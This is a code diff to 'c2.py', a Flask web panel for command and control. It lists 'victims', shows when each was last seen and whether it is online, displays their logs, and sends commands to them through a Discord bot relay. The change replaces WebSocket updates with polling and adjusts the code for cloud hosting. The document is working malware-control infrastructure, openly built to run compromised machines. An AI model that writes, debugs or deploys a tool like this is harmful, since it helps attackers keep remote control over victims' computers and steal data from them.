@@ -1,11 +1,8 @@
-# c2.py – Fixed for Render (uses gevent instead of eventlet)
+# c2.py – C2 Panel with REST API polling (no WebSocket)
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
-from flask_socketio import SocketIO
 
 app = Flask(__name__)
-# Use async_mode='gevent' to avoid eventlet issues
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHANNEL_ID = os.environ.get("CHANNEL_ID")
@@ -65,23 +62,11 @@ def fetch_loop():
                         log_queues[victim_id].append(rest)
                         if len(log_queues[victim_id]) > 200:
                             log_queues[victim_id] = log_queues[victim_id][-200:]
-                        socketio.emit('new_victim', {'victims': get_victims_list()})
-                        socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                 if msgs:
                     last_id = msgs[0]["id"]
         except Exception as e:
             print(f"Fetch error: {e}")
         time.sleep(1)
-
-def get_victims_list():
-    vlist = []
-    for vid, data in victims.items():
-        vlist.append({
-            "id": vid,
-            "last_seen": data["last_seen"],
-            "online": (time.time() - data["last_seen"]) < 70
-        })
-    return vlist
 
 threading.Thread(target=fetch_loop, daemon=True).start()
 
@@ -91,7 +76,14 @@ def index():
 
 @app.route('/api/victims')
 def api_victims():
-    return jsonify(get_victims_list())
+    vlist = []
+    for vid, data in victims.items():
+        vlist.append({
+            "id": vid,
+            "last_seen": data["last_seen"],
+            "online": (time.time() - data["last_seen"]) < 70
+        })
+    return jsonify(vlist)
 
 @app.route('/api/logs/<victim_id>')
 def api_logs(victim_id):
@@ -115,14 +107,13 @@ def send_command():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ---------- HTML (same beautiful UI) ----------
+# ---------- HTML with polling (no WebSocket) ----------
 HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <title>⚡ C2 PANEL · Multi‑Victim Control</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -163,7 +154,7 @@ HTML = """
 <div class="container">
     <div class="header">
         <h1>⚡ C2 PANEL</h1>
-        <div class="badge">🎮 Discord Relay • Real‑time</div>
+        <div class="badge">🎮 Discord Relay</div>
     </div>
     <div class="victims-grid" id="victimsGrid"></div>
     <div class="main-panel">
@@ -190,16 +181,8 @@ HTML = """
     <footer>💡 Commands sent via Discord bot • Results appear here</footer>
 </div>
 <script>
-    const socket = io();
     let currentVictim = null;
     let victims = {};
-
-    socket.on('connect', () => console.log('WebSocket connected'));
-    socket.on('new_victim', () => refreshVictims());
-    socket.on('new_log', (data) => {
-        if (data.victim === currentVictim) addLog(data.log);
-        refreshVictims();
-    });
 
     function refreshVictims() {
         fetch('/api/victims').then(r=>r.json()).then(data => {
@@ -262,7 +245,21 @@ HTML = """
         document.getElementById('customCmd').value = '';
     }
 
-    setInterval(refreshVictims, 3000);
+    setInterval(refreshVictims, 2000);
+    setInterval(() => {
+        if (currentVictim) {
+            fetch(`/api/logs/${currentVictim}`).then(r=>r.json()).then(logs => {
+                const panel = document.getElementById('logsPanel');
+                // only add new logs if length changed
+                const currentCount = panel.children.length;
+                if (logs.length > currentCount) {
+                    for (let i = currentCount; i < logs.length; i++) {
+                        addLog(logs[i]);
+                    }
+                }
+            });
+        }
+    }, 2000);
     refreshVictims();
 </script>
 </body>
@@ -271,4 +268,5 @@ HTML = """
 
 if __name__ == '__main__':
     load_data()
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
